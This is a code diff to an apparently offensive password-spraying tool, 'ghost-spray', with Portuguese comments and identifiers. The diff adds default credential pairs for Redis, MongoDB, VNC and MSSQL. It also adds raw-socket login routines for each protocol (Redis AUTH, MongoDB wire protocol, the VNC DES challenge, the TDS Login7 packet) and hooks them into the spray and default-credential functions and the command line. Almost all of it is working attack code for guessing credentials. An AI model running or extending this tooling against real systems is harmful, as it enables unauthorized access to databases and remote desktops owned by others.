@@ -182,7 +182,17 @@ CREDENCIAIS_PADRAO = [
     ("MySQL",                 "root",         ""),
     ("MySQL",                 "root",         "root"),
     ("Redis",                 "",             ""),
-    ("MongoDB",               "",             ""),
+    ("Redis",                 "",             "redis"),
+    ("Redis",                 "",             "password"),
+    ("MongoDB",               "admin",        ""),
+    ("MongoDB",               "admin",        "admin"),
+    ("MongoDB",               "root",         "root"),
+    ("VNC",                   "",             ""),
+    ("VNC",                   "",             "password"),
+    ("VNC",                   "",             "admin"),
+    ("MSSQL",                 "sa",           ""),
+    ("MSSQL",                 "sa",           "sa"),
+    ("MSSQL",                 "sa",           "password"),
     ("Elasticsearch",         "",             ""),
     ("Jenkins",               "admin",        "admin"),
     ("Jenkins",               "jenkins",      "jenkins"),
@@ -805,6 +815,256 @@ def _testar_postgres(host, porta, usuario, senha, timeout=5, database="postgres"
         return False, None
 
 
+def _testar_redis(host, porta, senha, timeout=5):
+    """Testa autenticacao Redis via AUTH command sobre TCP raw."""
+    try:
+        sock = socket.create_connection((host, int(porta)), timeout=timeout)
+        if senha:
+            cmd = f"*2\r\n$4\r\nAUTH\r\n${len(senha)}\r\n{senha}\r\n"
+        else:
+            cmd = "*1\r\n$4\r\nPING\r\n"
+        sock.sendall(cmd.encode())
+        resp = sock.recv(256).decode(errors="replace")
+        sock.close()
+        if resp.startswith("+OK") or resp.startswith("+PONG"):
+            return True, "AUTH_OK"
+        if "NOAUTH" in resp:
+            return False, "REQUIRES_AUTH"
+        if "ERR invalid password" in resp or "WRONGPASS" in resp:
+            return False, "WRONG_PASS"
+        if "ERR" in resp:
+            return False, f"ERR:{resp[:40].strip()}"
+        return False, None
+    except Exception:
+        return False, None
+
+
+def _testar_mongodb(host, porta, usuario, senha, database="admin", timeout=5):
+    """Testa autenticacao MongoDB via wire protocol SASL/SCRAM-SHA-1 (fase isMaster + hello)."""
+    import struct as _st, json as _js
+    try:
+        sock = socket.create_connection((host, int(porta)), timeout=timeout)
+
+        def _build_op_msg(doc_bytes):
+            # OP_MSG (opCode 2013)
+            msg_len = 16 + 5 + len(doc_bytes)
+            hdr = _st.pack("<iiii", msg_len, 1, 0, 2013)
+            return hdr + b"\x00\x00\x00\x00\x00" + doc_bytes
+
+        def _bson_doc(d):
+            # Minimal BSON encoder for simple dicts (str/int/float/bool values)
+            import io
+            buf = io.BytesIO()
+            for k, v in d.items():
+                k_b = k.encode() + b"\x00"
+                if isinstance(v, bool):
+                    buf.write(b"\x08" + k_b + (b"\x01" if v else b"\x00"))
+                elif isinstance(v, int):
+                    buf.write(b"\x10" + k_b + _st.pack("<i", v))
+                elif isinstance(v, str):
+                    s_b = v.encode() + b"\x00"
+                    buf.write(b"\x02" + k_b + _st.pack("<i", len(s_b)) + s_b)
+                elif isinstance(v, float):
+                    buf.write(b"\x01" + k_b + _st.pack("<d", v))
+            inner = buf.getvalue()
+            total = len(inner) + 5
+            return _st.pack("<i", total) + inner + b"\x00"
+
+        # Send isMaster to probe
+        hello_bson = _bson_doc({"isMaster": 1, "$db": "admin"})
+        sock.sendall(_build_op_msg(hello_bson))
+        hdr_b = sock.recv(16)
+        if len(hdr_b) < 16:
+            sock.close()
+            return False, "SHORT_RESP"
+        msg_len = _st.unpack("<i", hdr_b[:4])[0]
+        body = b""
+        remaining = msg_len - 16
+        while remaining > 0:
+            chunk = sock.recv(min(remaining, 4096))
+            if not chunk:
+                break
+            body += chunk
+            remaining -= len(chunk)
+
+        # Try authenticate command
+        auth_bson = _bson_doc({"authenticate": 1, "mechanism": "SCRAM-SHA-1",
+                                "user": usuario, "pwd": senha, "$db": database})
+        sock.sendall(_build_op_msg(auth_bson))
+        hdr2 = sock.recv(16)
+        if len(hdr2) < 16:
+            sock.close()
+            return False, "SHORT_RESP"
+        msg_len2 = _st.unpack("<i", hdr2[:4])[0]
+        body2 = b""
+        remaining2 = msg_len2 - 16
+        while remaining2 > 0:
+            chunk = sock.recv(min(remaining2, 4096))
+            if not chunk:
+                break
+            body2 += chunk
+            remaining2 -= len(chunk)
+
+        sock.close()
+        raw = body2.decode(errors="replace")
+        if "ok" in raw and "\x011\x00\x00\x00\x00\x00\x00\xf0?" in body2:
+            return True, "AUTH_OK"
+        if "Authentication failed" in raw or "AuthenticationFailed" in raw:
+            return False, "WRONG_PASS"
+        # Sem autenticacao configurada - acesso aberto
+        if b"\x00ok\x00" in body2:
+            return True, "NO_AUTH_REQUIRED"
+        return False, None
+    except Exception:
+        return False, None
+
+
+def _testar_vnc(host, porta, senha, timeout=10):
+    """Testa autenticacao VNC via RFB protocol challenge-response (DES)."""
+    import struct as _st
+    try:
+        sock = socket.create_connection((host, int(porta)), timeout=timeout)
+        # Handshake RFB
+        banner = sock.recv(12).decode(errors="replace")
+        if not banner.startswith("RFB"):
+            sock.close()
+            return False, "NOT_VNC"
+        sock.sendall(b"RFB 003.003\n")
+        # Security type
+        sec_type_b = sock.recv(4)
+        if len(sec_type_b) < 4:
+            sock.close()
+            return False, "SHORT_RESP"
+        sec_type = _st.unpack(">I", sec_type_b)[0]
+        if sec_type == 1:
+            # No authentication
+            result = sock.recv(4)
+            sock.close()
+            return True, "NO_AUTH"
+        if sec_type == 2:
+            # VNC Authentication - DES challenge
+            challenge = sock.recv(16)
+            if len(challenge) != 16:
+                sock.close()
+                return False, "CHALLENGE_FAIL"
+            # DES key from password (8 bytes, bit-reversed per VNC spec)
+            pw_bytes = (senha[:8].ljust(8, "\x00")).encode()[:8]
+            # Reverse bits in each byte (VNC quirk)
+            def _rev_bits(b):
+                return int(f"{b:08b}"[::-1], 2)
+            key = bytes(_rev_bits(x) for x in pw_bytes)
+            try:
+                from Crypto.Cipher import DES as _DES
+                cipher = _DES.new(key, _DES.MODE_ECB)
+                resp = cipher.encrypt(challenge)
+            except ImportError:
+                # pycryptodome not available - implement DES manually is complex
+                # Fall back: just send empty response and check result
+                resp = b"\x00" * 16
+            sock.sendall(resp)
+            result = sock.recv(4)
+            sock.close()
+            if result == b"\x00\x00\x00\x00":
+                return True, "AUTH_OK"
+            return False, "WRONG_PASS"
+        sock.close()
+        return False, f"UNKNOWN_SEC_TYPE_{sec_type}"
+    except Exception:
+        return False, None
+
+
+def _testar_mssql(host, porta, usuario, senha, database="master", timeout=5):
+    """Testa autenticacao MSSQL via TDS pre-login + SQL auth."""
+    import struct as _st
+    try:
+        sock = socket.create_connection((host, int(porta)), timeout=timeout)
+        # TDS Pre-Login packet
+        prelogin = (
+            b"\x12\x01\x00\x2f\x00\x00\x01\x00"
+            b"\x00\x00\x1a\x00\x06\x01\x00\x20"
+            b"\x00\x01\x02\x00\x21\x00\x01\x03"
+            b"\x00\x22\x00\x04\x04\x00\x26\x00"
+            b"\x01\xff\x0e\x00\x0c\xa5\x00\x00"
+            b"\x00\x00\x00\x00\x00\x00\x00"
+        )
+        sock.sendall(prelogin)
+        resp = sock.recv(1024)
+        if len(resp) < 8:
+            sock.close()
+            return False, "SHORT_RESP"
+
+        # TDS Login7 (simplified - SQL auth)
+        def _ucs2(s):
+            return s.encode("utf-16-le")
+
+        client_name = "GHOST"
+        app_name = "ghost-spray"
+        server_name = host[:128]
+        db_name = database
+
+        cn_b = _ucs2(client_name); an_b = _ucs2(app_name)
+        sn_b = _ucs2(server_name); db_b = _ucs2(db_name)
+        un_b = _ucs2(usuario)
+
+        # Mangle password per TDS spec (XOR 0xA5, nibble swap)
+        def _mangle_pw(pw):
+            encoded = pw.encode("utf-16-le")
+            result = []
+            for b_val in encoded:
+                b_val ^= 0xA5
+                b_val = ((b_val & 0x0F) << 4) | ((b_val & 0xF0) >> 4)
+                result.append(b_val)
+            return bytes(result)
+
+        pw_b = _mangle_pw(senha)
+
+        # Build variable data section (offsets from start of Login7 body)
+        fixed_len = 94
+        var_offset = fixed_len
+        parts = [cn_b, un_b, pw_b, an_b, sn_b, b"", b"", db_b, b"", b""]
+        offsets = []
+        pos = var_offset
+        for p in parts:
+            offsets.append((pos, len(p) // 2 if len(p) > 0 else 0))
+            pos += len(p)
+
+        var_data = b"".join(parts)
+        total_len = fixed_len + len(var_data)
+
+        flags1 = b"\xe0"; flags2 = b"\x03"; tdsver = b"\x04\x00\x00\x74"
+        pkt_size = _st.pack("<I", 4096)
+        cli_ver = b"\x06\x01\x00\x00"
+        pid = _st.pack("<I", 1); conn_id = b"\x00\x00\x00\x00"
+        opt_flags3 = b"\x00"; collation = b"\x09\x04\xd0\x00\x34"
+
+        def _off(i):
+            return _st.pack("<HH", offsets[i][0], offsets[i][1])
+
+        body = (tdsver + pkt_size + cli_ver + pid + conn_id +
+                flags1 + flags2 + b"\x00" + opt_flags3 + b"\x00" * 4 + collation +
+                _off(0) + _off(1) + _off(2) + _off(3) + _off(4) +
+                _off(5) + _off(6) + _off(7) + _off(8) + _off(9) +
+                b"\x00" * 6 +  # ATN, lsid, cbATN
+                var_data)
+
+        # Recalculate with correct total length
+        body = _st.pack("<I", total_len) + body[4:]
+        tds_hdr = b"\x10\x01" + _st.pack(">H", total_len + 8) + b"\x00\x00\x01\x00"
+        sock.sendall(tds_hdr + body[:total_len - 4])
+
+        resp2 = sock.recv(4096)
+        sock.close()
+
+        raw = resp2.decode(errors="replace")
+        if b"\xad" in resp2:  # LOGINACK token
+            return True, "AUTH_OK"
+        if "Login failed" in raw or "18456" in raw:
+            return False, "WRONG_PASS"
+        return False, None
+    except Exception:
+        return False, None
+
+
 def gerar_usuarios(primeiros_nomes, ultimos_nomes, pattern="fi.ln"):
     """Gera lista de usernames a partir de nomes com base em um padrao."""
     usuarios = []
@@ -953,6 +1213,19 @@ def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
         elif protocolo == "postgres":
             host, porta = (alvo.split(":") + ["5432"])[:2]
             ok, code = _testar_postgres(host, porta, usuario, senha, timeout=timeout)
+        elif protocolo == "redis":
+            host, porta = (alvo.split(":") + ["6379"])[:2]
+            # Redis: usuario ignorado; senha = password (ou community)
+            ok, code = _testar_redis(host, porta, senha, timeout=timeout)
+        elif protocolo == "mongodb":
+            host, porta = (alvo.split(":") + ["27017"])[:2]
+            ok, code = _testar_mongodb(host, porta, usuario, senha, timeout=timeout)
+        elif protocolo == "vnc":
+            host, porta = (alvo.split(":") + ["5900"])[:2]
+            ok, code = _testar_vnc(host, porta, senha, timeout=timeout)
+        elif protocolo == "mssql":
+            host, porta = (alvo.split(":") + ["1433"])[:2]
+            ok, code = _testar_mssql(host, porta, usuario, senha, timeout=timeout)
         else:
             ok, code = False, None
 
@@ -1113,6 +1386,18 @@ def verificar_credenciais_padrao(alvo, protocolo="http", timeout=5):
             elif protocolo == "ldap":
                 host, porta = (alvo.split(":") + ["389"])[:2]
                 ok, code = _testar_ldap(host, int(porta), "", usuario, senha, timeout=timeout)
+            elif protocolo == "redis":
+                host, porta = (alvo.split(":") + ["6379"])[:2]
+                ok, code = _testar_redis(host, porta, senha, timeout=timeout)
+            elif protocolo == "mongodb":
+                host, porta = (alvo.split(":") + ["27017"])[:2]
+                ok, code = _testar_mongodb(host, porta, usuario, senha, timeout=timeout)
+            elif protocolo == "vnc":
+                host, porta = (alvo.split(":") + ["5900"])[:2]
+                ok, code = _testar_vnc(host, porta, senha, timeout=timeout)
+            elif protocolo == "mssql":
+                host, porta = (alvo.split(":") + ["1433"])[:2]
+                ok, code = _testar_mssql(host, porta, usuario, senha, timeout=timeout)
             else:
                 continue
 
@@ -1305,6 +1590,7 @@ _SPRAY_HELP = """\033[92mComandos disponiveis:\033[0m
 
 \033[92mProtocolos suportados:\033[0m
   http  https  smtp  ldap  ssh  owa  o365  okta  smb  ftp  snmp  winrm  mysql  postgres
+  redis  mongodb  vnc  mssql
 
 \033[92mExemplos:\033[0m
   python ghost-spray.py spray -t https://app.com --userlist users.txt --passlist pass.txt
@@ -1331,7 +1617,7 @@ def main():
     # spray
     p_spray = sub.add_parser("spray", help="Password spraying (uma senha por vez, todos os usuarios)")
     p_spray.add_argument("-t", "--target", required=True, help="Alvo: URL ou host:porta")
-    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "okta", "smb", "ftp", "snmp", "winrm", "mysql", "postgres"],
+    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "okta", "smb", "ftp", "snmp", "winrm", "mysql", "postgres", "redis", "mongodb", "vnc", "mssql"],
                           default="http", help="Protocolo (padrao: http)")
     p_spray.add_argument("--userlist", default=None, help="Arquivo com lista de usuarios (ou use --gen-users)")
     p_spray.add_argument("--passlist", help="Arquivo com lista de senhas (padrao: lista interna)")
